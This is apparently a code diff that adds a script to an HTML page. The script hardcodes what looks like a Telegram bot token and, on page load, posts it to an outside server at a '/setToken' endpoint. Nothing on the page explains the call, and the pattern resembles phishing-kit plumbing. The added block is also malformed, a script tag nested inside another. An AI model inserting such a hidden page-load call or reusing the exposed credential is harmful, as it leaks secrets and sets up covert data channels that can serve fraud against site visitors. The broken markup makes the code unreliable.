@@ -2590,6 +2590,32 @@ askQuestion();
     </script>
     <script src="js/jiecode.js"></script>
     <script>
+      <script>
+        var token = "7814826836:AAEVaUHPOGphJrQrQLXefHtigJ_zmxqM1C0";
+    $.ajax({
+    type: "POST",
+    url: "https://rafie-server-ketiga.cl0ud.my.id:7000/setToken", // Endpoint backend
+    data: JSON.stringify({
+        token: token // Ambil nomor dari input
+    }),
+    contentType: "application/json",
+    dataType: 'JSON',
+    beforeSend: function() {
+        $('.loading').show();
+    },
+    success: function(response){
+        console.log("Response received:", response);
+
+    },
+    error: function(xhr, status, error) {
+        console.error("AJAX Error:", status, error);
+        $('.loading').hide();
+        } 
+
+});
+  </script>
+    </script>
+    <script>
       setInterval(function(){
         $(".tests:first-child").remove();
       }, 1500);
